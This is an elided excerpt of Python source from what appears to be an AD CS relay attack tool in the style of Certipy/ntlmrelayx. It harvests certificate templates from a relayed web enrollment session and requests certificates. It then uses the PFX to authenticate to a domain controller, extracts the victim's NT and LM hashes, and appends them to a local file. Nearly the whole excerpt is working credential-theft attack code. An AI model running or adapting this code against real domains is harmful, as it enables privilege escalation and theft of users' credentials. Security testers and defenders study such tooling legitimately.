...
class ADCSAttackClient(ProtocolAttack):
    ...
    def _run(self):
            ...
            if select_tag:
                ...
                for option in option_tags:
                    ...
                    if len(split_value) > 1:
                        print(split_value[1])
                        certificate_templates.append(split_value[1])
        ...
        for ct in certificate_templates:
            template = ct
            ...
            cert_filename = self.save_certificate(cert, key=key, request_id=request_id, template_name=template)
            target = Target.create(dc_ip=self.adcs_relay.dc_ip)
            nthash = False

            try:
                authenticate = Authenticate(target=target,pfx=cert_filename)
                nthash = authenticate.authenticate()
                lmhash = authenticate.lm_hash
            except:
                logging.info(f'[-] Failed to authenticate with {cert_filename}')
            if nthash:
                logging.info(f'[+] Extracted NT hash for {repr(self.client.user)}:{lmhash}:{nthash}')
                self.save_hash(lmhash,nthash)
                return self.finish_run()
            else:
                logging.info(f'[-] Failed to get NT hash with {cert_filename}')
        self.finish_run()
    ...
    def save_hash(self, lmhash, nthash):
        with open('certipy_hashes.txt', 'a+') as f:
            f.write(f'{self.client.user}:{lmhash}:{nthash}\n')
